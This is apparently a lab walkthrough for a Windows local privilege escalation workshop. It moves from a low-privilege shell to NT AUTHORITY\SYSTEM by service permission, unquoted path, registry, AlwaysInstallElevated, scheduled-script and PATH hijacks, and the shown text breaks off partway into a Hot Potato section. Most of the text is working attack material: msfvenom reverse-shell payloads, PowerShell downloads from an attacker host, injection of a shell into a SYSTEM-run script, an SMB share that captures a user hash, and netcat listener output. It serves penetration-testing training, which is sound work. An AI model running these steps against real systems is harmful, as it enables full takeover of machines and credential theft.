## Privilege Escalation Workshop using LPE Workshop (https://github.com/sagishahar/lpeworkshop) and some of my own custom binaries and scripts. ##

------------------------------------------------------------------------------------------------------------------------

Notes about privesc from Administrator to NT\System:

If you have an administrator account on a given Windows Desktop, you can elevate your privileges to NT\System with 100% reliability.

## Method #1: ## 
Drop your reverse shell payload and then register it as a service (see notes below about generating service payloads).
Once it is registered as a service, start the service and you are now NT\System.

## Method #2: ##
Drop your reverse shell payload and create a scheduled task to run as system. Have that scheduled task start your revshell binary. Once the task runs, you are now NT\System.

-------------------------------------------------------------------------------------------------------------------------

General notes about these privesc vectors:

I have seen all of the privesc vectors that I cover in my walkthrough in real applications in the last 2 years. These are still real privesc vectors.

Notes about Privesc Scripts/Tools used:

I use SharpUp and Seatbelt for these exercises. I have also run PowerUp against the host and didn't find any value that PowerUp added over either of the tools I used.

The one useful note for PowerUp is that you can run it in memory and a lot of Sig based AV will let you do it.

https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

Because this is a privilege escalation workshop, we are starting with a powershell reverse shell as a low privilege user. 

The goal for each exercise will be to get a NEW reverse shell as the NT\System user. 

We want to maintain our original low privilege shell so that we can have a backup shell.

<b>NOTE: Most of the time when exploiting services, we won't have rights to Start/Stop services. We would have to wait for a reboot. This workshop gives you Start/Stop rights so you don't have to reboot the machine constantly.</b>

Once we land on the machine, we want to get a quick look at the lay of the land. I have really been liking SharpUp from Ghostpack (https://github.com/GhostPack). SharpUp and Seatbelt are fantastic resources for enumerating privesc vectors. Let's start with SharpUp.

I setup a listening HTTP server and then transfer over the SharpUp binary so I can run it and see the results: 

Using this command in my powershell reverse shell: (New-Object System.Net.WebClient).DownloadFile("http://IPGOESHERE/SharpUp.exe", "C:\Users\user\Downloads\SharpUp.exe")

Then we run SharpUp.exe and look at the results.

The first thing we see is a Modifiable Service:

````
=== Modifiable Services ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"
  ````

 
 This is a great place to start. This shows us that we can modify the binpath of the service. 
 
 Bad access control on a service can lead to trivial privilege escalation. Any time that a standard user has rights to change the binary path (start location) of the service, they can hijack that into privilege escalation. 
 
 The ability to change binary path should be restricted to Administrators only. This is usually a gross oversight on the part of the developers or the sysadmin that provisioned the box. DACL stands for Discretionary Access Control List. Windows defaults to giving everyone access to an object unless a DACL is defined: https://support.microsoft.com/en-us/help/914392/best-practices-and-guidance-for-writers-of-service-discretionary-acces
 
 
So we create an executable to get our new elevated shell:
 
````
msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > daclservicehijack.exe
````

<b>You notice the format is exe-service so that we don't immediately lose our shell on service start.</b>

A note about why this matters:

When Windows makes a call to start a service, it calls the ServiceMain function and expects a return from this call. If you don't specify exe-service, the generated payload won't be able to give you a persistent shell.

You will notice all of my shells are generated as windows/shell_reverse_tcp. These are stageless shells so they can easily be caught through netcat.

More reading about staged vs stageless here: https://buffered.io/posts/staged-vs-stageless-handlers/

Then we transfer over the service file using our download logic again:

````
(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/daclservicehijack.exe", "C:\Users\user\Downloads\daclservicehijack.exe")
````

Then we modify the binpath of the service:

````
PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\daclservicehijack.exe"
[SC] ChangeServiceConfig SUCCESS
````


Then we query to make sure our changes were successful:

````
PS C:\Users\user\Downloads> sc.exe qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\Downloads\daclservicehijack.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
PS C:\Users\user\Downloads> 
````

Then we start the service:

````
PS C:\Users\user\Downloads> net start daclsvc
The DACL Service service is starting.
````


Then we immediately get a shell as NT\Authority system:

````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.98.
Ncat: Connection from 10.22.6.98:52636.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>
````

Next up let's tackle modifiable service binaries.

````
=== Modifiable Service Binaries ===

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
  ````

 So there is a service binary at that path that our user has full control over. Typically application developers will give users access to the folders of their binaries when they want to ease update processes or allow users to import custom modules/code. In this case, where the binary is tied to a service that was registered as NT\System, we can overwrite that binary to achieve privilege escalation.
 
 First let's verify the permissions on that file.
 
 ````
 PS C:\Program Files\File Permissions Service> icacls.exe *.exe
filepermservice.exe Everyone:(F)
                    NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Program Files\File Permissions Service> 
````

We can see that everyone has full control: Everyone:(F).

So let's use msfvenom to generate a service binary that we can use to replace that vulnerable service:

````
root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPHERE LPORT=31337 -f exe-service > filepermservice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes
````

Note that we have to name it the same thing as the original service.

So now we replace the original service: (Note, if the service is running, it's difficult to replace this binary. This means that you could have a startup script that would try to swap the binaries before the service started but otherwise, you are out of luck. Luckily for us, the service is NOT running.)

Check the service one more time:
````
PS C:\Users\user\Downloads> sc.exe qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
PS C:\Users\user\Downloads> 
````

Then we start the service:

````
PS C:\Users\user\Downloads> net start filepermsvc
The File Permissions Service service is starting.
PS C:\Users\user\Downloads> 
````

We get a reverse shell as the NT\SYSTEM user:
````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.98.
Ncat: Connection from 10.22.6.98:63289.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>
````

Next let's look at "Always install elevated"

From SharpUp we see: 

````
=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1
  ````

  This means that any install that is run will automatically elevate the privileges it runs with so that low privilege users can run installs without needing an administrator to come over to their workstation.
  
  To exploit this we just need to run an .msi installer.
  
  We generate the payload:
  ````
  root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.22.6.122 -f msi > Install.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
````

Then we transfer the payload to the victim machine:
````
(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/Install.msi", "C:\Users\user\Downloads\Install.msi")
````

Then when we run the install, we will get a reverse shell as NT\Authority System

````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.98.
Ncat: Connection from 10.22.6.98:63300.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>
````

Next let's look at AutoRuns:

From SharpUp:

````
=== Modifiable Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe
  ````
  
This means that we can replace the binary in that location with our malicious binary, and the next time an Administrator logs in, we will get an Administrator shell. This is an unreliable privesc and something that is more suited to persistence. We use msfvenom to generate the payload and then transfer it to the box.

````
PS C:\Users\user\Downloads> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/program.exe", "C:\Program Files\Autorun Program\program.exe")
PS C:\Users\user\Downloads> dir C:\Progra~1\"Autorun Program"



    Directory: C:\Program Files\Autorun Program


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---        12/19/2019   8:34 AM      73802 program.exe                                                               


PS C:\Users\user\Downloads> 
````

Now the next time an Administrator logs into the machine, we will get a shell as an administrator. This is also useful for getting persistence as mentioned above.

Next let's take a look at something that will require a different privesc script (we will come back to SharpUp for some other stuff in a bit).

We are going to run Seatbelt (also from GhostPack) and see what we get there.

We transfer Seatbelt.exe over to the machine and see this for services: 
````
=== Non Microsoft Services (via WMI) ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Users\user\Downloads\daclservicehijack.exe
  IsDotNet         : False

  Name             : dllsvc
  DisplayName      : DLL Hijack Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
  IsDotNet         : False

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
  IsDotNet         : False

  Name             : PathHijackService
  DisplayName      : PathHijackService
  Company Name     : 
  Description      : 
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Path Hijack\PathHijackService.exe"
  IsDotNet         : True

  Name             : regsvc
  DisplayName      : Insecure Registry Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
  IsDotNet         : False

  Name             : unquotedsvc
  DisplayName      : Unquoted Path Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  IsDotNet         : False
````
 These are all of the non-standard Windows Services that are installed on the machine.
 
 If we look at the last one listed (ignoring the obvious name) we see that the PathName is missing quotes around the name. This can be an issue that will lead to privilege escalation IF we can control any piece of the path with a space along the way. If you do not quote the path to a service binary, Windows assumes you want to try to execute the binary at every stop along the directory path. Windows assumes you are passing arguments to a binary at the stops along the way. So the example above shows us that there are 3 stops along the way that could lead to execution. Let's take a look at this:
 
 ````
 C:\Program SPACE Files\Unquoted SPACE Path Service\Common SPACE Files\unquotedpathservice.exe
 ````
 
 Every place that SPACE appears, is a place that we could put a binary and hope that it gets executed. In order in the path we could put:
 ````
 C:\Program.exe
 C:\Program Files\Unquoted.exe
 C:\Program Files\Unquoted Path Service\Common.exe
 ````
 
 If we can write to any of these locations, we can achieve privilege escalation.
 
 Let's check our permissions each step along the way:
 
 First we check the root of the C:\ drive
 
````PS C:\Users\user\Downloads> icacls.exe C:\      
C:\ BUILTIN\Administrators:(F)
    BUILTIN\Administrators:(OI)(CI)(IO)(F)
    NT AUTHORITY\SYSTEM:(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)

Successfully processed 1 files; Failed processing 0 files
````

We see that we can read and execute, but we can't write.

Next stop:
````
PS C:\Users\user\Downloads> icacls.exe C:\Progra~1\
C:\Progra~1\ NT SERVICE\TrustedInstaller:(F)
             NT SERVICE\TrustedInstaller:(CI)(IO)(F)
             NT AUTHORITY\SYSTEM:(M)
             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
             BUILTIN\Administrators:(M)
             BUILTIN\Administrators:(OI)(CI)(IO)(F)
             BUILTIN\Users:(RX)
             BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
             CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
````

We can't write to the Program Files folder either.

````PS C:\Users\user\Downloads> icacls.exe C:\"Program Files"\"Unquoted Path Service"
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\Users\user\Downloads> 
````

We can however write to the Unquoted Path Service folder.
This means that if we create an executable named Common.exe, we can get a reverse shell as NT\System the next time the service is started.

So, we create the binary: 

````
msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > Common.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes
````

Then we start our handler to catch the reverse shell:

````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
````


Then we transfer the binary:
````
PS C:\Program Files\Unquoted Path Service> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/Common.exe", "C:\Program Files\Unquoted Path Service\Common.exe")
PS C:\Program Files\Unquoted Path Service> ls


    Directory: C:\Program Files\Unquoted Path Service


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d----        12/17/2019  12:31 PM            Common Files                                                              
-a---        12/19/2019   9:32 AM      15872 Common.exe                                                                


PS C:\Program Files\Unquoted Path Service>
````

Then we start the service:
``net start unquotedsvc``

Then we get a reverse shell as the NT\Authority System user:

````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.49.
Ncat: Connection from 10.22.6.49:64557.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>
````

While digging through Seatbelt: we find that there are registry auto-login settings: This gives us the local user credentials.

````
=== Registry Auto-logon Settings ===

  DefaultUserName         : user
  DefaultPassword         : password321
  ````
  
There is a scheduled task privesc in the LPE workshop, but I feel like it's not exploitable, so I am going to inject a scheduled task privesc that I have seen on Windows a number of times. The reason that is it not exploitable is because as a standard user, you cannot see scheduled tasks that are running as SYSTEM the majority of the time. If the folder isn't named something dead obvious, you wouldn't be able to know there is even a missing file to replace. So I created a still contrived but much more believable version.

Developers LOVE to comment their code and scripts. So if we find a writable directory that appears to be a Dev folder: 

``C:\DevTools`` we should read through the code in there.

Because this is contrived, it will be a little easier to identify. Let's talk about other things though. If we read through some code/script that looks like it should be run frequently (cleanup, provision) we can assume some privileged user is running that script. We can inject our logic into that script and try to privilege escalation. These are also a FANTASTIC place to find credentials. Lazy sysadmins LOVE to put credentials in their scripts to eliminate the chance of error. If it "just works" then it's better for everyone.

````
PS C:\DevTools> ls


    Directory: C:\DevTools


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---        12/19/2019  10:12 AM        208 Cleanup.ps1                                                               


PS C:\DevTools> 
````

We can see there is a Cleanup script in the folder. Let's take a look at what it does.

````
PS C:\DevTools> Get-Content Cleanup.ps1
#This script is run every 5 minutes to clean up the dev tools directory.
#This will make sure all of your .txt files get cleaned up. It's running as SYSTEM to make sure permissions are NOT an issue
Remove-Item "C:\DevTools\*.txt"
PS C:\DevTools> 
````

This script is annotated for us, and tells us that it will run every 5 minutes to purge the current directory of all .txt files. So if we create our own reverse shell and place it in that powershell script, we will get a new reverse shell as the NT\Authority System user.

You might think this exercise is 100% contrived, but I have seen this privesc a great number of times.

So let's create the reverse shell.

Take the powershell reverse shell from: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

Edit the IP and Port.

Encode using: https://raikia.com/tool-powershell-encoder/

Put that into Cleanup.ps1 on your attacking machine.

Then we transfer the script to our victim:

``(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/Cleanup.ps1", "C:\DevTools\Cleanup.ps1")``

Then we wait.

Now we see we have a Powershell reverse shell as NT\Authority System

````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.49.
Ncat: Connection from 10.22.6.49:64606.

PS C:\Windows\system32> whoami.exe
nt authority\system
PS C:\Windows\system32> hostname.exe
LPETestbed
PS C:\Windows\system32>
````
Whenever we encounter non-standard services, we want to audit their security. Privesc scripts are good for that, but we should also do it manually. I like to audit Windows Services using these steps:

1. Service Path
  * Is the service path quoted?
  * Is the service binary writable with my permissions?
  * Is the directory of the service binary writable?
2. Registry
  * Are the registry entries for the service writable?
  * Are there keys that the service is referencing that are writable?
  * Is the service modifying OTHER registry keys?
3. PATH issues
  * Are there things in front of %WINDIR% in the PATH?
  * Is the first thing in the PATH writable?
4. Hijacking issues
  * Is the service referencing dlls/exes by relative instead of absolute paths?
  * Is the service relying on Windows to locate binaries?
  
These are some quick checks we can do to audit services.

So let's look at one of the services that was listed as non-standard and start from the top.

````  
Name             : regsvc
  DisplayName      : Insecure Registry Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
  IsDotNet         : False
  ````
  The service path is quoted.
  
  Let's check our permissions on the service:
  
  ````
  PS C:\Program Files> icacls.exe "Insecure Registry Service"
Insecure Registry Service NT SERVICE\TrustedInstaller:(I)(F)
                          NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                          BUILTIN\Administrators:(I)(F)
                          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                          BUILTIN\Users:(I)(RX)
                          BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                          CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
````
We can see that we can't write to that folder, or delete it.

What about the binary itself?

````
PS C:\Program Files\Insecure Registry Service> icacls.exe *
insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                            BUILTIN\Administrators:(I)(F)
                            BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
````
We can't do anything to the binary itself.

Let's check the registry:

````
PS C:\Users\user\Downloads> Get-Acl -Path HKLM:\System\CurrentControlSet\Services\regsvc | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)



PS C:\Users\user\Downloads> 
````
Bingo! We have full control of the registry key for that service.

So now we create our payload:
````
root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > insecureregistryservice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes
````
Now we transfer that file to a location we control:

``(New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/insecureregistryservice.exe", "C:\Users\user\Downloads\insecureregistryservice.exe")``

Then we modify the registry key:

````
PS C:\Users\user\Downloads> reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\Downloads\insecureregistryservice.exe /f
The operation completed successfully.

PS C:\Users\user\Downloads> 
````
Then we start the service:
````
PS C:\Users\user\Downloads> net start regsvc
The Insecure Registry Service service is starting.
PS C:\Users\user\Downloads> 
````
And now we have a shell as NT\Authority SYSTEM
````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.49.
Ncat: Connection from 10.22.6.49:64643.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>
````


Next let's take a look at another non-standard service:

````
Name             : PathHijackService
  DisplayName      : PathHijackService
  Company Name     : 
  Description      : 
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Path Hijack\PathHijackService.exe"
  IsDotNet         : True
  ````
Looking at this service:
The path is quoted. Let's check our permissions on the folder:

````
PS C:\Program Files> icacls.exe "Path Hijack"
Path Hijack NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Users:(I)(RX)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\Program Files> 
````
We don't have rights to the folder.
````
PS C:\Program Files\Path Hijack> icacls.exe * 
PathHijackService.exe NT AUTHORITY\SYSTEM:(I)(F)
                      BUILTIN\Administrators:(I)(F)
                      BUILTIN\Users:(I)(RX)

PathHijackService.exe.xml NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          BUILTIN\Users:(I)(RX)

Successfully processed 2 files; Failed processing 0 files
PS C:\Program Files\Path Hijack> 
````
We don't have rights to the executable or the config file.

````
PS C:\Program Files\Path Hijack> Get-Acl -Path HKLM:\System\CurrentControlSet\Services\PathHijackService |fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\PathHijackService
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Users Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
Audit  : 
Sddl   : O:BAG:SYD:AI(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A
         ;CIIOID;GA;;;CO)
````
We can't modify the registry key.

So now we start looking into other kinds of hijacks.

Let's grab a copy of the executable:

````
PS C:\Program Files\Path Hijack> Copy-Item "C:\Program Files\Path Hijack\PathHijackService.exe" -Destination "C:\Users\user\Downloads\PathHijackService.exe"
````
Now let's transfer it to our attacking platform:

We setup an SMB share:

````
root@kali:~/Tools/impacket/examples# python smbserver.py Shared /root/LPEWorkshop/
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation


````

Then we transfer the file over:

````
Copy-Item "C:\Users\user\Downloads\PathHijackService.exe" -Destination "\\YOURIPHERE\Shared\PathHijackService.exe"

````
Coincidentally we also got the user hash, so we should try to crack that at some point.

Now we can start analyzing the service.

Let's use r2 to look at the service (I won't try to summarize using r2, that's homework for you)

We can eventually find that the service is starting "ipconfig.exe" on a timer.

[![r2image](https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/LPEWorkshopImages/r2.JPG)]

This means that if there is a PATH vulnerability we can inject our malicious ``ipconfig.exe`` into the PATH and get it executed instead of the legit binary.

Now: lots of developers will just blindly call Windows executables without specifying the full path to the binary. This breaks down when some application puts their location first in the PATH variable. This can happen because developers want to have an easier time calling their own binaries, but almost always leads to privilege escalation due to other applications on the host calling windows binaries without the full path.

ALWAYS USE ABSOLUTE PATHS

Let's check the PATH variable from our previous scripts:
````
=== System Environment Variables ===

  ComSpec                             : C:\Windows\system32\cmd.exe
  FP_NO_HOST_CHECK                    : NO
  NUMBER_OF_PROCESSORS                : 1
  OS                                  : Windows_NT
  Path                                : C:\DevTools;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Temp;C:\Temp
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  PROCESSOR_ARCHITECTURE              : x86
  PROCESSOR_IDENTIFIER                : x86 Family 6 Model 60 Stepping 3, GenuineIntel
  PROCESSOR_LEVEL                     : 6
  PROCESSOR_REVISION                  : 3c03
  PSModulePath                        : C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
  TEMP                                : C:\Windows\TEMP
  TMP                                 : C:\Windows\TEMP
  USERNAME                            : SYSTEM
  windir                              : C:\Windows
  windows_tracing_flags               : 3
  windows_tracing_logfile             : C:\BVTBin\Tests\installpackage\csilogfile.log
````

We can see that C:\DevTools is first in the path. If we can control C:\DevTools and drop a malicious binary named ipconfig.exe into it, we will get our malicious payload executed.

Let's check permissions:

````
PS C:\> icacls.exe DevTools
DevTools BUILTIN\Users:(OI)(CI)(F)
         BUILTIN\Administrators:(I)(F)
         BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
PS C:\> 
````
We have full control!

So now we create our payload:

````
root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe > ipconfig.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
````

We transfer it to our victim host:

````
PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/ipconfig.exe", "C:\DevTools\ipconfig.exe")
PS C:\> 
````

Now we wait for the service to call our malicious executable.

And we get a shell as NT\Authority System
````
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.49.
Ncat: Connection from 10.22.6.49:52119.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>
````
### Let's talk about Hot Potato ###

Hot potato is a vulnerability that deals with local spoofing of NBNS and WPAD.

There is a more complete explanation here: https://foxglovesecurity.com/2016/01/16/hot-potato/

So we want to get a new reverse shell as NT\Authority SYSTEM.

We are going to use the Invoke-Tater.ps1 powershell script that comes with Empire: https://github.com/BC-SECURITY/Empire

We copy that file locally into our LPE directory.

````
root@kali:~/LPEWorkshop# cp /root/Tools/Empire/data/module_source/privesc/Invoke-Tater.ps1 .
root@kali:~/LPEWorkshop# 
````

Then we transfer that file to our victim machine:

````
PS C:\Users\user\Downloads> IEX (New-Object Net.WebClient).DownloadFile('http://YOURIPHERE/Invoke-Tater.ps1', 'C:\Users\user\Downloads\Invoke-Tater.ps1')
PS C:\Users\user\Downloads> 
````

Now we import that module so that we can invoke the script:

````
PS C:\Users\user\Downloads> Import-Module C:\Users\user\Downloads\Invoke-Tater.ps1
````

